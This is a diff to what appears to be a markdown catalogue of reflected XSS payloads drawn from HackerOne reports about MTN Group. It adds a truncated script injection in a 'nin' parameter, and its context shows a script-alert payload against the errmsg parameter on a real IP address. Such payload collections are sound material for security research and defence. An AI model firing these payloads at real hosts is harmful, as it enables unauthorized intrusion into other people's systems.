@@ -1,6 +1,6 @@
 # MTN Group
 
-8 payloads.
+9 payloads.
 
 ### `43e07acc`
 
@@ -74,6 +74,15 @@ https://102.176.160.119:10443/remote/error?errmsg=--%3E%3Cscript%3Ealert(documen
 
 **Parameter:** `errmsg`
 — [Reflected cross site scripting (XSS) attacks Reflected XSS attacks, ](https://hackerone.com/reports/1799197) · MTN Group · [0xmr_b4rayz](https://hackerone.com/0xmr_b4rayz)
+
+### `113bdbfb`
+
+```
+https://target.com/nin/success?message=lol&nin=<script
+```
+
+**Parameter:** `nin`
+— [Reflected XSS in https://target.com/nin/success?message=lol&nin=<VULNERABLE>](https://hackerone.com/reports/2039384) · MTN Group · [hazemhussien99](https://hackerone.com/hazemhussien99)
 
 ### `fcc45cbe`
 
